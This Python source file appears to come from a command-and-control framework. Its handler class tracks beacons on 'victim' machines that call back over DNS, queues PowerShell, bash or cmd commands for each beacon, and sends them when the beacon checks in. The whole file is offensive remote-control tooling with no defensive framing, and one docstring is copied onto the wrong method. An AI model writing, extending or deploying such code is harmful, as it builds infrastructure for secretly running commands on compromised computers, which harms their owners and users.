from socketserver import BaseRequestHandler
import backend.handlers as handlers
from datetime import datetime, timedelta
from frontend.util.structs import CommandType, Command




class ProvenanceClientHandler(BaseRequestHandler):

    client_count = 0

    """ Builtin Functions"""
    def __init__(self, request, client_address, serverinfo, hostname="", handler=None):
        # Superclass initialization
        self.request = request
        self.client_address = client_address
        self.server = serverinfo

        # Subclass Initialization
        self.hostname = hostname or f"Client_{self.client_count}"
        self.queued_commands = []
        self.sent_commands = []
        self.command_count = 0
        # The model that tracks each controlled machine
        # TODO: somehow dynamically assess the protocol (maybe set up multiple ports)
        if request:
            self.protocol_handler = handler or handlers.dns.DNSHandler(
                ip=client_address[0], socket=request[1]
            )
        else:
            self.protocol_handler = None
        self.last_active = None
        self.client_count += 1

    def __repr__(self):
        return f"ProvenanceClient{{{self.server[1]}, {self.hostname}}}"

    def update_handler(self, request,  client_address):
        """
        Update this instance to use the new request and socket
        parameters. Originally :module: socketserver.UDPServer
        would create a new instance for each request, this
        method must be called or the request will be sent
        to the previous temporary port used by the beacon
        to call back
        :param request: the request received by the server
        :param client_address: tuple of (IP, port)
        :return: None
        """
        self.client_address = client_address
        self.request = request
        if not self.protocol_handler:
            self.protocol_handler = handlers.dns.DNSHandler(
                ip=client_address[0], socket=request[1]
            )

    def handle(self):
        """
        The method required by BaseRequestHandler that handles the
        incoming request. Will tell the underlying protocol
        handler (DNS, HTTP, ICMP, etc) to send the given command if there
        is one queued, else send NOP
        :return:  None
        """
        _, port = self.client_address
        self.last_active = datetime.now()
        if self.queued_commands:
            cmd_to_be_sent = self.queued_commands.pop()[:2]
        else:
            cmd_to_be_sent = (CommandType.NOP, "NONE")
        self.protocol_handler.handle_request(self.request, port, cmd_to_be_sent)
        self.sent_commands.append((self.command_count, cmd_to_be_sent))

    def queue_command(self, ctype, cmd):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param ctype: type of command :module: protocolhandler.Commands
        :param cmd: the command to be sent
        :return: None
        """
        convert = {"ps": CommandType.PS, "bash":CommandType.BASH, "cmd":CommandType.CMD}
        command_type = convert[ctype]
        self.queued_commands.append(Command(command_type, cmd, self.command_count))
        self.command_count += 1

    def remove_command(self, cmd_id):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param ctype: type of command :module: protocolhandler.Commands
        :param cmd: the command to be sent
        :return: None
        """
        for i, cmd in enumerate(self.queued_commands):
            if cmd.uid == cmd_id:
                self.queued_commands.pop(i)

    def get_queued_commands(self):
        return self.queued_commands

    def get_sent_commands(self):
        return self.sent_commands

    def get_last_active(self):
        if not self.last_active:
            return "N/A"
        else:
            delta = datetime.now() - self.last_active
            return f"{delta.seconds//60}m"

    def get_command_count(self):
        return self.command_count

    def get_hostname(self):
        if not self.hostname:
            return "N/A"
        return self.hostname

    def get_ip(self):
        if not self.client_address:
            return "N/A"
        return self.client_address[0]




